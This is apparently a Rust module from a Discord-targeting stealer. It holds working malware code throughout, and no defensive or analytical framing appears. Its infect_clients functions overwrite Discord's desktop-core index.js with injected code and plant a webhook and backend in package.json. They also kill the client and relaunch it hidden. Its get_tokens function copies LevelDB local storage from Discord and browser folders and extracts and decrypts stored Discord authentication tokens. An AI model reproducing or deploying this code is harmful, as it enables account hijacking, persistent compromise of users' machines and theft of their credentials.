#[path = "constants.rs"]
mod constants;
#[path = "crypto.rs"]
mod crypto;
use leveldb::database::Database;
use leveldb::options::{Options, ReadOptions};
use serde_json::Value;
use winapi::um::shellapi::ShellExecuteA;
use winapi::um::winuser::SW_HIDE;
use std::ffi::CString;
use std::{env, fs};
use std::{
    path::{Path, PathBuf},
};
use sysinfo::{ProcessExt, SystemExt};
use uuid::Uuid;
use walkdir::WalkDir;

fn infect_client(
    client_dir: &PathBuf,
    client_executable: &'static str,
    shortcut_name: &'static str,
) {
    for entry in WalkDir::new(client_dir).follow_links(true) {
        let entry = entry.unwrap();
        let path = entry.path();

        if path.is_dir() {
            if path.to_string_lossy().ends_with("discord_desktop_core") {
                fs::write(path.join("index.js"), constants::INJECT_CODE).unwrap();

                let options_path = path.join("package.json");

                let contents = fs::read_to_string(&options_path).unwrap();

                let mut config: Value = serde_json::from_str(&contents).unwrap();
                config["encrypted_webhook"] =
                    Value::String(constants::ENCRYPTED_WEBHOOK.to_string());
                config["backend"] = Value::String(constants::BACKEND.to_string());
                config["first_time"] = Value::Bool(true);
                fs::write(&options_path, config.to_string()).unwrap();
            }
        }
    }

    if constants::REFRESH_DISCORD {
        let mut system = sysinfo::System::new();
        system.refresh_all();

        let roaming = env::var("APPDATA").unwrap();
        let roaming_path = Path::new(roaming.as_str());

        if system.processes_by_name(client_executable).count() == 0 {
            return;
        }

            for process in system.processes_by_name(client_executable) {
                process.kill();
            }

            let shortcut_dir =
                roaming_path.join("Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc");
            let shortcut_path = shortcut_dir.join(shortcut_name);

            if shortcut_path.exists() {
                let lp_file = CString::new(shortcut_path.to_str().unwrap()).unwrap();

                unsafe {
                    ShellExecuteA(
                        std::ptr::null_mut(),
                        std::ptr::null(),
                        lp_file.as_ptr(),
                        std::ptr::null(),
                        std::ptr::null(),
                        SW_HIDE,
                    );
                }
            }
    }
}

pub fn infect_clients() {
    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    for (path, client_executable, shortcut_name) in constants::CLIENT_TARGETS.iter() {
        let client_dir = appdata_dir.join(path);

        if client_dir.exists() {
            infect_client(
                &client_dir,
                client_executable,
                shortcut_name
            );
        }
    }
}

fn decrypt_token(cipher_text: &str, local_state_path: &PathBuf) -> Option<String> {
    if let Some(master_key) = crypto::get_master_key(&local_state_path) {
        let plain_text = crypto::aes_decrypt(base64::decode(cipher_text).ok().unwrap(), &master_key);
        return Some(String::from_utf8(plain_text).ok().unwrap());
    }
    return None;
}

pub fn copy_directory<U: AsRef<Path>, V: AsRef<Path>>(
    src: U,
    dst: V,
) -> Result<(), std::io::Error> {
    let mut stack = Vec::new();
    stack.push(PathBuf::from(src.as_ref()));

    let output_root = PathBuf::from(dst.as_ref());
    let input_root = PathBuf::from(src.as_ref()).components().count();

    while let Some(working_path) = stack.pop() {
        let src: PathBuf = working_path.components().skip(input_root).collect();

        let dest = if src.components().count() == 0 {
            output_root.clone()
        } else {
            output_root.join(&src)
        };

        if fs::metadata(&dest).is_err() {
            fs::create_dir_all(&dest)?;
        }

        for entry in fs::read_dir(working_path)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_dir() {
                stack.push(path);
            } else {
                if let Some(filename) = path.file_name() {
                    fs::copy(&path, &dest.join(filename))?;
                }
            }
        }
    }

    Ok(())
}

pub fn get_tokens() -> Vec<String> {
    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");
    let temp_env = std::env::temp_dir();

    let mut tokens = Vec::new();

    for token_target in constants::TOKEN_TARGETS {
        let token_dir = appdata_dir.join(token_target);

        if !token_dir.exists() {
            continue;
        }

        let leveldb_dir = token_dir.join("Local Storage").join("leveldb");

        if !leveldb_dir.exists() {
            continue;
        }

        let temp_dir = temp_env.join(Uuid::new_v4().to_string());

        if copy_directory(&leveldb_dir, &temp_dir).is_err() {
            continue;
        }

        let options = Options::new();
        let database = match Database::open(&temp_dir, &options) {
            Ok(database) => database,
            Err(_) => {
                continue;
            }
        };

        let read_opts = ReadOptions::new();

        // _https://discord.com☺tokens
        let key = [
            95, 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111,
            109, 0, 1, 116, 111, 107, 101, 110, 115,
        ];

        let bytes = match database.get_u8(&read_opts, &key).unwrap() {
            Some(bytes) => bytes,
            None => continue,
        };

        let json: Value = serde_json::from_slice(&bytes[1..]).unwrap();

        if let Some(obj) = json.as_object() {
            for value in obj.values() {
                let token = match value.as_str() {
                    Some(token) => token,
                    None => continue,
                };

                if token.starts_with("dQw4w9WgXcQ:") {
                    let local_state_path = token_dir.join("Local State");

                    if let Some(plaintext) = decrypt_token(&token[12..], &local_state_path) {
                        tokens.push(plaintext);
                    }
                } else {
                    tokens.push(token.to_string());
                }
            }
        }

        drop(database);
        fs::remove_dir_all(temp_dir).unwrap();
    }

    tokens
}
